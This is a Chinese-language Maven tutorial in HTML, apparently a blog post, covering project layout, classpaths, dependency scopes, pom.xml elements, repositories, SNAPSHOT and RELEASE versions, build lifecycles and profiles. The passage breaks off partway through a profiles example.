        <content type="html"><![CDATA[<h2 id="什么是Maven"><a href="#什么是Maven" class="headerlink" title="什么是Maven"></a>什么是Maven</h2><ol><li>Maven 是一个项目管理工具，可以对 Java,  C#，Ruby，Scala 和其他语言项目进行构建、依赖管理</li><li>Maven是IDEA(用于java)自带的构建工具</li><li>Maven的功能<ol><li><strong>构建</strong></li><li>文档生成</li><li>报告</li><li><strong>依赖</strong></li><li>SCMs</li><li><strong>发布</strong></li><li><strong>分发</strong></li><li>邮件列表</li></ol></li></ol><h2 id="项目目录结构"><a href="#项目目录结构" class="headerlink" title="项目目录结构"></a>项目目录结构</h2><ol><li><p>Maven项目的标准目录结构</p><ol><li>有一个项目描述文件pom.xml</li><li>存放Java源码的目录是src&#x2F;main&#x2F;java</li><li>存放资源文件的目录是src&#x2F;main&#x2F;resources</li><li>存放测试源码的目录是src&#x2F;test&#x2F;java</li><li>存放测试资源的目录是src&#x2F;test&#x2F;resources</li><li>所有编译、打包生成的文件都放在target目录里</li></ol></li><li><p><strong>不要随意修改目录结构</strong>：所有的目录结构都是约定好的标准结构，IDEA会自动生成</p><ol><li>~&#x2F;.m2&#x2F;repository: Maven默认的本地仓库目录位置</li><li>${basedir}&#x2F;src&#x2F;main&#x2F;webapp&#x2F;WEB-INF: web应用文件目录，web项目的信息，比如存放web.xml、本地图片、jsp视图页面</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a-maven-project</span><br><span class="line">├── pom.xml</span><br><span class="line">├── src</span><br><span class="line">│   ├── main</span><br><span class="line">│   │   ├── java/</span><br><span class="line">│   │   ├── resources/</span><br><span class="line">|   |   └── webapp/</span><br><span class="line">|   |       └── WEB-INF/</span><br><span class="line">│   └── test</span><br><span class="line">│       ├── java/</span><br><span class="line">│       └── resources/</span><br><span class="line">└── target</span><br><span class="line">    ├── classes/</span><br><span class="line">    ├── test-classes/</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="maven-classpath"><a href="#maven-classpath" class="headerlink" title="maven classpath"></a>maven classpath</h2><ol><li>Maven通过其构建生命周期自动管理项目的类路径(与maven build相关)<ol><li><em><strong>与常说的classpath区别与关系</strong></em><ol><li>基础：Maven Classpath 是 Classpath 的一种实现方式，专门用于Maven项目。Maven通过其插件机制和依赖管理系统，自动化了类路径的管理过程</li><li>目的：两者的目的都是为了确保Java应用程序能够找到并加载所需的类和资源文件，但在Maven项目中，这一过程由Maven自动完成</li></ol></li></ol></li><li>编译类路径（Compile Classpath）<ol><li>项目源代码：位于src&#x2F;main&#x2F;java目录下的所有源代码</li><li>依赖库：从远程仓库下载的所有依赖项（包括直接依赖和传递依赖） –&gt; scope: compile</li><li>资源文件：位于src&#x2F;main&#x2F;resources目录下的所有资源文件</li></ol></li><li>运行类路径（Runtime Classpath）<ol><li>编译后的类文件：位于target&#x2F;classes目录下的所有.class文件</li><li>依赖库：从远程仓库下载的所有依赖项（与编译类路径类似，但不包括仅用于测试的依赖） –&gt; scope: runtime, compile</li><li>资源文件：位于target&#x2F;classes目录下的所有资源文件</li></ol></li><li>测试类路径（Test Classpath）<ol><li>测试源代码：位于src&#x2F;test&#x2F;java目录下的所有测试代码</li><li>测试资源文件：位于src&#x2F;test&#x2F;resources目录下的所有资源文件</li><li>编译后的类文件：位于target&#x2F;classes目录下的所有.class文件</li><li>依赖库：从远程仓库下载的所有依赖项（包括直接依赖和传递依赖），以及测试范围的依赖项（如JUnit）</li></ol></li></ol><table><thead><tr><th>scope</th><th>编译类路径 (Compile Classpath)</th><th>测试类路径 (Test Classpath)</th><th>运行类路径 (Runtime Classpath)</th></tr></thead><tbody><tr><td>compile</td><td>包含</td><td>包含</td><td>包含</td></tr><tr><td>provided</td><td>包含</td><td>包含</td><td>不包含</td></tr><tr><td>runtime</td><td>不包含</td><td>包含</td><td>包含</td></tr><tr><td>test</td><td>不包含</td><td>包含</td><td>不包含</td></tr><tr><td>system</td><td>包含</td><td>包含</td><td>不包含</td></tr></tbody></table><h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><h3 id="pom必须结构"><a href="#pom必须结构" class="headerlink" title="pom必须结构"></a>pom必须结构</h3><ol><li>POM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件</li><li>pom.xml基本结构和常用结构<ol><li><p>必备结构</p><ol><li>所有 POM 文件都需要 project 元素和三个必需字段：groupId，artifactId，version</li></ol><table><thead><tr><th>元素</th><th>描述</th></tr></thead><tbody><tr><td>project</td><td>项目的根元素，包含所有的子元素</td></tr><tr><td>groupId</td><td>项目的组织标识符，通常是组织的域名倒序，比如：com.example</td></tr><tr><td>artifactId</td><td>项目的唯一标识符，通常是项目名，比如：my-project</td></tr><tr><td>version</td><td>项目的版本号，通常是 x.y.z 格式，比如：1.0.0</td></tr></tbody></table></li><li><p>IDEA自动生成的pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 声明 XML 版本和编码格式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- &lt;project&gt;：根元素，定义了 Maven POM 文件的命名空间和模式位置。 --&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- xmlns：定义了 Maven POM 的命名空间。 --&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- xmlns:xsi：定义了 XML Schema 实例的命名空间。 --&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- xsi:schemaLocation：指定了 POM 文件的 XML Schema 位置 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;modelVersion&gt;：指定 POM 模型的版本，固定为 4.0.0 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.kc1zs4<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>JavaSec_CC_review<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;groupId&gt;：项目所属的组织或团队的唯一标识符，通常使用反转域名（如 org.apache.shiro） --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;artifactId&gt;：项目的唯一标识符，通常是项目名称（如 JavaSec_CC_review） --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;version&gt;：项目的版本号，1.0-SNAPSHOT 表示这是一个开发中的快照版本 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;properties&gt;：定义项目中使用的属性，便于统一管理和复用 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="pom常用结构"><a href="#pom常用结构" class="headerlink" title="pom常用结构"></a>pom常用结构</h3><ol><li>常用结构</li></ol><table><thead><tr><th>元素</th><th>描述</th></tr></thead><tbody><tr><td>name</td><td>项目的名称</td></tr><tr><td>description</td><td>项目的描述</td></tr><tr><td>packaging</td><td>项目的打包方式，通常是 jar 或 war</td></tr><tr><td>properties</td><td>定义一些属性，比如编码、Java版本等</td></tr><tr><td>dependencies</td><td>定义项目的依赖库，包括 groupId、artifactId 和 version 三个元素</td></tr><tr><td>build</td><td>定义项目的构建配置，包括插件、资源等</td></tr><tr><td>profiles</td><td>定义项目的配置文件，用于不同环境的构建配置(特定的配置)</td></tr><tr><td>repositories</td><td>定义项目的仓库配置，用于下载依赖库</td></tr></tbody></table><h4 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h4><ol><li>dependencies结构<ol><li><p>在Maven中声明一个依赖项可以自动下载并导入classpath</p></li><li><p>Maven使用groupId，artifactId和version唯一定位一个依赖</p></li><li><p>解释以下这里的<code>&lt;scope&gt;</code>: 这里是build阶段中的</p><ol><li>compile：默认值，适用于所有阶段，依赖项会被打包到最终的JAR或WAR文件中，确保应用程序在部署后能够正常运行 –&gt;<ol><li>项目的核心功能实现所必需的库。例如，Spring框架、Hibernate等</li></ol></li><li>provided：意味着该依赖将在编译和测试时使用，但在运行时由容器或JDK提供(环境提供) –&gt;<ol><li>使用场景：Servlet API、JSP API等，这些API通常由应用服务器提供</li></ol></li><li>runtime：表示该依赖不是编译所必需的，但需要在运行时和测试阶段存在 –&gt;<ol><li>数据库连接所需的驱动程序，如MySQL、PostgreSQL驱动</li><li>在运行时通过反射或<strong>其他机制动态加载的库</strong></li></ol></li><li>test：仅在测试编译和执行阶段可用。这类依赖通常用于单元测试框架或测试工具 –&gt;<ol><li>单元测试框架：用于编写和运行单元测试的框架，如JUnit、TestNG</li><li>测试工具：辅助测试的工具，如Mockito、PowerMock</li></ol></li><li>import：仅限于<code>&lt;dependencyManagement&gt;</code>部分，用于从另一个POM中导入依赖管理配置(模块化)</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="packaging"><a href="#packaging" class="headerlink" title="packaging"></a>packaging</h4><ol><li><p>packaging</p><ol><li>jar：Java 应用程序</li><li>war：Web 应用程序</li><li>pom：父项目或聚合项目</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h4><ol><li>properties<ol><li><p>功能: 针对的主要是项目的一些配置属性</p><ol><li>属性引用: 可以在 POM 文件的其他部分通过 ${property.name} 引用，支持跨模块复用</li></ol>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 定义属性 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- project.build.sourceEncoding：表示项目源码的字符编码，通常应设定为UTF-8 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引用属性 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>$&#123;project.build.sourceEncoding&#125;<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>从Java 9开始，推荐使用maven.compiler.release属性，保证编译时输入的源码和编译输出版本一致。如果源码和输出版本不同，则应该分别设置maven.compiler.source和maven.compiler.target</p><ol><li>maven.compiler.release：表示使用的JDK版本，例如21；</li><li>maven.compiler.source：表示Java编译器读取的源码版本；</li><li>maven.compiler.target：表示Java编译器编译的Class版本。</li></ol></li></ol></li></ol><h4 id="build"><a href="#build" class="headerlink" title="build"></a>build</h4><ol><li>build<ol><li>用于配置项目的构建过程，详见maven build</li></ol></li></ol>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 默认构建目标 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">defaultGoal</span>&gt;</span>install<span class="tag">&lt;/<span class="name">defaultGoal</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 输出目录 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">directory</span>&gt;</span>$&#123;project.basedir&#125;/target<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 最终构建名称 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>$&#123;project.artifactId&#125;-$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 资源目录 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 插件配置 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">source</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="repositories"><a href="#repositories" class="headerlink" title="repositories"></a>repositories</h4><ol><li><p>repositories</p><ol><li><p>如果仓库需要认证（如私有仓库），Maven 会使用 <code>&lt;id&gt;</code> 在 settings.xml 中查找对应的认证信息</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servers</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>my-company-repo<span class="tag">&lt;/<span class="name">id</span>&gt;</span> <span class="comment">&lt;!-- 与 pom.xml 中的 &lt;id&gt; 对应 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>user<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>password<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servers</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Maven 中央仓库的默认 <code>&lt;id&gt;</code>: central</p></li><li><p>对于私有仓库或其他第三方仓库，可以自定义 <code>&lt;id&gt;</code></p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>central<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://repo.maven.apache.org/maven2<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>example-repo<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://example.com/maven-repo<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="SNAPSHOT和RELEASE"><a href="#SNAPSHOT和RELEASE" class="headerlink" title="SNAPSHOT和RELEASE"></a>SNAPSHOT和RELEASE</h3><ol><li>RELEASE：表示稳定版本，不会有变化 –&gt; Release版本会被上传到远程仓库的发布库（release repository）中<br>发布库中的文件一旦上传后不能被覆盖，确保了版本的唯一性和不可变性</li><li>SNAPSHOT：表示开发中版本，不稳定，可能会有变化<ol><li>自动更新<ol><li>Maven会自动检查远程仓库中是否有新的SNAPSHOT版本，并下载最新版本</li><li>这意味着每次构建时，可能会获取到不同的SNAPSHOT版本，因此构建结果可能不一致</li></ol></li><li>快照存储<ol><li>SNAPSHOT版本会被上传到远程仓库的快照库（snapshot repository）中</li><li>快照库中的文件可以被覆盖，即同一个版本号的SNAPSHOT可以有多个不同的构建结果</li></ol></li><li>时间戳版本<ol><li>当上传SNAPSHOT版本时，Maven会在远程仓库中生成带有时间戳的文件名，例如 my-app-1.0-20250214.100500-1.jar</li></ol></li></ol></li></ol><h2 id="maven-build"><a href="#maven-build" class="headerlink" title="maven build"></a>maven build</h2><blockquote><p>build是Maven的核心功能之一，用于构建项目，包括编译、测试、打包、部署等</p></blockquote><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><ol><li><p>build生命周期<br><img src="/pic/JavaWeb4_Maven/maven_build_lifecycle.png" alt="pic"></p><ol><li>为了完成 default 生命周期，以下阶段（包括其他未在上面罗列的生命周期阶段）将被按顺序地执行 –&gt; 一般到verify就o了</li><li><strong>在一个生命周期中，运行某个阶段的时候，它之前的所有阶段都会被运行</strong></li></ol><p> <img src="/pic/JavaWeb4_Maven/maven_build_stages.png" alt="pic"></p><table><thead><tr><th>阶段</th><th>描述</th></tr></thead><tbody><tr><td>validate</td><td>验证项目是否正确且所有必须信息是可用的</td></tr><tr><td>compile</td><td>编译源代码</td></tr><tr><td>test</td><td>使用适当的单元测试框架（例如JUnit）运行测试</td></tr><tr><td>package</td><td>将编译后的代码打包成可分发的格式，例如 JAR和WAR</td></tr><tr><td>verify</td><td>对集成测试的结果进行检查，以保证质量达标</td></tr><tr><td>install</td><td>安装打包的项目到本地仓库，以供其他项目使用</td></tr><tr><td>deploy</td><td>拷贝最终的工程包到远程仓库中，以共享给其他开发人员和工程</td></tr></tbody></table></li><li><p><em><strong>Maven有3个标准生命周期</strong></em></p><ol><li><strong>clean生命周期</strong>: 清理项目，删除目标目录中的编译输出文件(out)。这通常是在构建之前执行的，以确保项目从一个干净的状态开始</li><li><strong>Default生命周期(项目)</strong>:（也称为 Build 生命周期）<ol><li>validate</li><li>compile</li><li>test</li><li>package</li><li>verify</li><li>install</li><li>deploy</li></ol></li><li><strong>Site生命周期(信息)</strong>: 生成项目站点文档，发布站点文档<ol><li>site：生成项目文档和站点信息</li><li>deploy-site：将生成的站点信息发布到远程服务器，以便共享项目文档</li></ol></li></ol></li><li><p>构建阶段由插件目标构成: 略</p></li></ol><h3 id="配置文件-profile"><a href="#配置文件-profile" class="headerlink" title="配置文件:profile"></a>配置文件:profile</h3><h4 id="profile介绍与结构"><a href="#profile介绍与结构" class="headerlink" title="profile介绍与结构"></a>profile介绍与结构</h4><ol><li><p>构建配置文件是一系列的配置项的值，可以用来设置或者覆盖 Maven 构建默认值: 比如properties、dependencies、build等</p><ol><li><p><strong>不同的环境</strong>：生产环境（Production），开发（Development）环境定制构建方式</p></li><li><p><strong>pom.xml中指定</strong>: 在 pom.xml 文件中使用 activeProfiles 或者 profiles 元素<strong>指定配置文件&#x2F;配置内容!!!</strong></p><ol><li>配置文件在构建时修改 POM(模型)，并且用来给参数设定不同的目标环境（比如开发（Development）、测试（Testing）和生产环境（Production）中数据库服务器的地址）</li></ol></li><li><p><strong>三种类型</strong></p><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>项目级(Per Project)</td><td>指定在项目的POM文件pom.xml中(.&#x2F;pom.xml)</td></tr><tr><td>用户级(Per User)</td><td>指定在Maven的设置xml文件中 (%USER_HOME%&#x2F;.m2&#x2F;settings.xml)</td></tr><tr><td>全局(Global)</td><td>指定在 Maven 全局的设置 xml 文件中 (%M2_HOME%&#x2F;conf&#x2F;settings.xml)</td></tr></tbody></table></li><li><p><strong>激活方式(一般用前3种)</strong></p><ol><li>使用命令控制台输入显式激活</li><li>通过 maven 设置</li><li>基于环境变量（用户或者系统变量）</li><li>操作系统设置（比如说，Windows系列）</li><li>文件的存在或者缺失</li></ol></li></ol></li><li><p><em><strong>基本结构</strong></em></p><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td><code>&lt;id&gt;</code></td><td>Profile 的唯一标识符，用于在命令行中激活或引用。</td></tr><tr><td><code>&lt;activation&gt;</code></td><td>定义 Profile 的激活条件（可选）。</td></tr><tr><td><code>&lt;properties&gt;</code></td><td>定义自定义属性，可以在构建过程中使用。</td></tr><tr><td><code>&lt;dependencies&gt;</code></td><td>定义该 Profile 特有的依赖。</td></tr><tr><td><code>&lt;build&gt;</code></td><td>定义该 Profile 特有的构建配置（如插件、资源等）。</td></tr></tbody></table> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 